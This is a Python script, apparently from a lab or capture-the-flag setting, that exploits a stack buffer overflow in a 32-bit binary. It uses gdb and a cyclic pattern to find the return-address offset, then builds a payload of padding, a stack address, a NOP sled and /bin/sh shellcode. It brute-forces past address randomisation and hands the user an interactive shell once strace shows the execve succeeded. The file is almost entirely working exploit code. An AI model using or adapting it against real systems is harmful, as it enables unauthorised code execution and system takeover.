import subprocess
import struct
import os
import re
import sys
import pty
import select
import fcntl

from pwn import *

log_file_path = 'strace.log'


def cleanup(exit_code: int):

    os.remove("trash")
    os.remove("vuln_payload")
    os.remove("strace.log")
    sys.exit(exit_code)


def stack_middle_address(output):

    # Find the line containing the word "stack" and extract the address in the middle
    output_lines = output.split('\n')
    stack_line = next((line for line in output_lines if 'stack' in line), None)
    
    if stack_line is None:
        print("GDB failed to find the stack line.")
        cleanup(1)
    
    pattern = r'\b0x[0-9a-f]+\b'
    matches = re.findall(pattern, stack_line)
    
    start_address = int(matches[0], 16)
    end_address = int(matches[1], 16)
    
    middle = (start_address + end_address) // 2
    middle += 4  #all the addresses end in 00 and when this is concatenated in bytes in the payload, it starts with \x00 and terminates the payload. Adding 4 to avoid the \x00 sequence

    return middle


def generate_test():
    return cyclic(1000)


def locate_ra(pattern):
    gdb_proc = subprocess.Popen(
        [f"gdb vuln"], 
        stdin=subprocess.PIPE, 
        stdout=subprocess.PIPE, 
        stderr=subprocess.PIPE, 
        shell=True, 
        text=True
    )
    commands = f"""
    set pagination off
    r
    {pattern.decode('latin-1')}
    """

    gdb_proc.stdin.write(commands)
    gdb_proc.stdin.flush()

    while True:
        output = gdb_proc.stdout.readline()
        if "Program received signal SIGSEGV" in output:
            break

    gdb_proc.stdin.write("info registers\n")
    gdb_proc.stdin.flush()

    gdb_proc.stdin.write("q\n")
    gdb_proc.stdin.write("y\n")
    gdb_proc.stdin.flush()

    output, _ = gdb_proc.communicate()
    
    eip_value = None
    for line in output.splitlines():
        if "eip" in line:  # Find the line with 'eip'
            eip_value = line.split()[1]  # Extract the hexadecimal value (second column)
            break

    offset = cyclic_find(int(eip_value, 16))
    return offset


def target_ra(vuln):

    #find in what adresses the stack fluctuates -> info proc mapping

    #first expand the stack filling it up with as many trash bytes as we can, will pass the trash file as command line argument
    trash = b'B'*131000
    trash_args = "`cat trash` " * 15    
    open("trash", "wb").write(trash)  

    gdb_process = subprocess.Popen(
        f"gdb {vuln}", 
        stdin=subprocess.PIPE, 
        stdout=subprocess.PIPE, 
        stderr=subprocess.PIPE, 
        text=True, 
        shell=True
    )

    commands = f"""
    set disable-randomization off
    set breakpoint pending on
    b main
    r {trash_args}
    info proc mapping
    q
    y
    """

    gdb_process.stdin.write(commands)
    gdb_process.stdin.flush()
    output, _ = gdb_process.communicate()

    return output


def construct_payload(offset, vuln):

    middle = stack_middle_address(target_ra(vuln))
    shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'

    #!!! will change
    offset += 4 
    #!!!

    payload = b'A' * offset
    payload += struct.pack("<I", middle)
    payload += b'\x90' * 200000
    payload += shellcode

    open("vuln_payload", "wb").write(payload)


def drain_fd(fd: int):
    try:
        while True:
            rlist, _, _ = select.select([fd], [], [], 0.1)
            if not rlist:
                break     #drained all trash content
            
            try:
                os.read(fd, 10000)
            except OSError:
                break
    except Exception as e:
        print(f"An error occurred while draining the buffer: {e}")
        cleanup()


def attach_strace():
    main_pid = os.getpid()
    strace_command = f"strace -f -e execve -p {str(main_pid)} -o strace.log"

    #all error logs to devnull to keep stdout clean
    with open(os.devnull, 'w') as devnull:
        subprocess.Popen(
            strace_command, 
            shell=True, 
            stderr=devnull
        )


    while not os.path.isfile('strace.log'):
        time.sleep(0.1)


def detect_crash(pid: int):
    pid_str = str(pid)

    # pattern to detect the SIGCHLD signal with a SIGSEGV e.g. SIGCHLD {si_signo=SIGCHLD, si_code=CLD_DUMPED, si_pid=15595, si_uid=0, si_status=SIGSEGV, si_utime=0, si_stime=3}
    pattern = re.compile(
        rf"{pid_str}.*SIGCHLD.*si_status=SIGSEGV"
        # rf"{ppid_str}.*SIGCHLD.*si_pid={pid_str}.*si_status=(139|[^,]*SIGSEGV)" => THis line occurs after the exploit process terminates, right now the exploit proc is still running
    )

    try:
        with open(log_file_path, 'r') as log_file:
            lines = log_file.readlines()

            for line in lines:
                # print(line)

                if pattern.search(line):
                    return True

    except FileNotFoundError:
        print(f"Log file '{log_file_path}' not found.")
        cleanup()
    except Exception as e:
        print(f"An error occurred while reading the log file: {e}")
        cleanup()

    return False


def detect_execve():
    pattern = re.compile(
        r"\d+\s+execve\(\"/bin//sh\", NULL, NULL\)\s+=\s+0"
    )

    try:
        with open(log_file_path, 'r') as log_file:
            lines = log_file.readlines()
            for line in lines:
                if pattern.search(line):
                    return True

    except FileNotFoundError:
        print(f"Log file '{log_file_path}' not found.")
        cleanup(1)
    except Exception as e:
        print(f"An error occurred while reading the log file: {e}")
        cleanup(1)

    return False


def main():
        
    if len(sys.argv) != 2:
        print("No executable file provided")
        sys.exit(1)

    vuln = sys.argv[1]
    

    if not os.access(f'/app/{vuln}', os.X_OK):
        print(f"./{vuln}: Permission denied")
        sys.exit(1)


    #this program has PIE enabled -> compilation option that changes the location of the executable in every run

    ra_offset = locate_ra(generate_test())
    construct_payload(ra_offset, vuln)
    attach_strace()

    #performing brute force attack
    exploit_command = f"cat vuln_payload - | ./{vuln} " + " ".join(["`cat trash`"] * 15)
    i = 0
    while True:
        print(f"i: {i}")
        i += 1

        master_fd, slave_fd = pty.openpty()

        exploit_proc = subprocess.Popen(
            exploit_command, shell=True, 
            stderr=slave_fd, 
            stdin=slave_fd, 
            stdout=slave_fd, 
            close_fds=True
        )
        os.write(master_fd, b'\n')

        # print(f"\033[94mexploit proc pid: {exploit_proc.pid}\033[0m")
    
        while True:

            if detect_execve():
                #successful exploit, in shell
                drain_fd(master_fd)

                while True:
                    os.write(1, b'# ')
                    user_input = os.read(0, 5000)
                    
                    if b'exit' in user_input:
                            exploit_proc.terminate()
                            os.close(master_fd)
                            os.close(slave_fd)
                            cleanup(0)

                    
                    os.write(master_fd, user_input)  # Forward user input to the exploit shell
                    rlist_response, _, _ = select.select([master_fd], [], [], 0.1)

                    while master_fd in rlist_response:
                        response = os.read(master_fd, 1024)
                        response = response.replace(b'\r', b'')
                        if response != user_input:
                            os.write(1, response)
                            break

                        rlist_response, _, _ = select.select([master_fd], [], [], 0.1)


            rlist, _, _ = select.select([master_fd], [], [], 0.1)

            if master_fd in rlist:                
                try:
                    output = os.read(master_fd, 100000)
                    if output:
                        if detect_crash(exploit_proc.pid) or i == 1:    #must find the bug related to the first run and the missing logs!
                            with open(log_file_path, 'a+') as log_file:
                                fcntl.flock(log_file, fcntl.LOCK_EX)
                                try:
                                    # print(f"fp position before truncating: {log_file.tell()}")
                                    # print(f"file size: {os.path.getsize(log_file_path)}")
                                    log_file.truncate(0)                    #empty the log file from the logs of the previous attempts to minimize the load of the linear search
                                    log_file.seek(0)
                                    # print(f"fp position after truncating: {log_file.tell()}")

                                finally:
                                    fcntl.flock(log_file, fcntl.LOCK_UN)
                            break
                    else:
                        break
                except OSError:
                    break

        os.close(master_fd)
        os.close(slave_fd)
            


if __name__ == "__main__":
    main()